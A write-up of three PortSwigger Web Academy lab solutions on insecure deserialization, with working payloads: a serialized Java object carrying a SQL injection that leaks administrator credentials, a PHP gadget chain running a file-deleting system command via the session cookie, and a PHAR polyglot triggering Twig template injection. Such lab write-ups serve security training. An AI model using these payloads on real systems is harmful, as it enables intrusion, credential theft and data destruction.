---
title: PortSwigger Web Academy
description: Write-up of PortSwigger Web Academy challenges.
ignore_macros: true
---

# PortSwigger Web Academy

## Insecure deserialization

### Custom gadget chain for Java deserialization

> Lab: [Developing a custom gadget chain for Java deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization)

**1.** Source code leaks via backup file :

- /backup/AccessTokenUser.java
- /backup/ProductTemplate.java

```java
package data.session.token;
// ...

public class AccessTokenUser implements Serializable
{
    private final String username;
    private final String accessToken;

    public AccessTokenUser(String username, String accessToken)
    {
        this.username = username;
        this.accessToken = accessToken;
    }

    // ...
}
```

```java
package data.productcatalog;
// ...

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "password"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    // ...
}
```

- The `readObject` from `ProductTemplate` is vulnerable to SQL injection.
- Our session cookie is a serialized instance of `AccessTokenUser`.

**2.** Inject the session cookie with a serialized instance of `ProductTemplate` to extract the administrator's credentials.

```bash
$ mkdir -p data/productcatalog
$ mv ProductTemplate.java data/productcatalog/
$ javac data/productcatalog/ProductTemplate.java && \
    java -classpath . 'data/productcatalog/ProductTemplate'
ProductTemplate serialized !
$ base64 /tmp/product.ser -w0 | sed 's/=/%3D/g'
rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQABHRvdG8%3D
```

**3.** Inject a single quote inside the SQL query to test the SQL injection.

```java
// ...

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;

    public static void main(String[] args) {
            ProductTemplate prod = new ProductTemplate("'");

            try {
                    FileOutputStream fileOut = new FileOutputStream("/tmp/product.ser");
                    ObjectOutputStream out = new ObjectOutputStream(fileOut);
                    out.writeObject(prod);
                    out.close();
                    fileOut.close();
            } catch (IOException i) {
                    i.printStackTrace();
            }

            System.out.println("ProductTemplate serialized !");
    }
}
```

```html
$ curl -s 'https://0aa0005c04509f21c0decf2f00a600a1.web-security-academy.net/my-account' \
    -b "session=$(base64 /tmp/product.ser -w0 | sed 's/=/%3D/g')" \
    | grep 'Internal Server Error' -A 1
<h4>Internal Server Error</h4>
<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException:
ERROR: unterminated quoted string at or near &quot;&apos;&apos;&apos; LIMIT 1&quot;
```

The SQL injection is working !

**4.** To extract the administrator's credentials, we need to :

- Enumerate the number of columns with NULL parameter (count = 8)
- Find a reflected column
- Cast VARCHAR to INTEGER (due to the type of the query)

SQL injection :

```java
ProductTemplate prod = new ProductTemplate("1' UNION SELECT NULL,NULL,NULL,CAST (username||':'||password AS integer),NULL,NULL,NULL,NULL FROM users --");
```

Result :

```html
<h4>Internal Server Error</h4>
<p class=is-warning>java.io.IOException: org.postgresql.util.PSQLException:
ERROR: invalid input syntax for type integer: &quot;administrator:snncluoa4gd5o83oz315&quot;</p>
```

Credentials : `administrator:snncluoa4gd5o83oz315`

### Custom gadget chain for PHP deserialization

> Lab: [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

**1.** Source code leaks via backup file :

- /cgi-bin/libs/CustomTemplate.php~

```php
class CustomTemplate {
    // ...

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class DefaultMap {
    // ...

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

**2.** Create serialization payload

```php
<?php

class CustomTemplate {}
class Product {}
class Description {}
class DefaultMap {}

$defaultMap = new DefaultMap();
$defaultMap->callback = "system";

$customTemplate = new CustomTemplate();
$customTemplate->desc = $defaultMap;
$customTemplate->default_desc_type = "rm /home/carlos/morale.txt";

echo serialize($customTemplate);
```

**3.** Execute it via cookie

```bash
$ php xpl.php
O:14:"CustomTemplate":2:{s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";}%
$ php xpl.php | base64 -w0 | sed 's/=/%3D/g'
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6NDoiZGVzYyI7TzoxMDoiRGVmYXVsdE1hcCI6MTp7czo4OiJjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjE3OiJkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D
$ curl 'https://0ae800d704396245c019105e00b3005d.web-security-academy.net/' -b "session=$(php xpl.php | base64 -w0 | sed 's/=/%3D/g')"
```

### PHAR deserialization & custom gadget chain

> Lab : [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)

**1.** Source code leaks via directory listing and backup file :

- /cgi-bin/CustomTemplate.php~
- /cgi-bin/Blog.php~

```php
class Blog {
    // ...

    public function __toString() {
        return $this->twig->render('index', ['user' => $this->user]);
    }

    public function __wakeup() {
        $loader = new Twig_Loader_Array([
            'index' => $this->desc,
        ]);
        $this->twig = new Twig_Environment($loader);
    }
}

class CustomTemplate {
    // ...

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lockFilePath());
    }

    private function lockFilePath()
    {
        return 'templates/' . $this->template_file_path . '.lock';
    }
}
```

- *Blog* `__wakeup()` - setup SSTI payload
- *CustomTemplate* `__destruct()` -> `lockFilePath()` -> *Blog* `__toString()` - run SSTI payload

**2.** Create an unserialize payload to trigger the Twig SSTI

```php
$blog = new Blog('toto',
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("<SEHLL_COMMAND>")}}');
$object = new CustomTemplate($blog);
```

**3.** Create a polyglot phar/jpeg file thanks to [xanhacks/phar-jpg-polyglot](https://gitlab.com/xanhacks/phar-jpg-polyglot/).

**4.** Upload malicious phar as avatar picture.

**5.** Load/execute it by visiting `/cgi-bin/avatar.php?avatar=phar://wiener`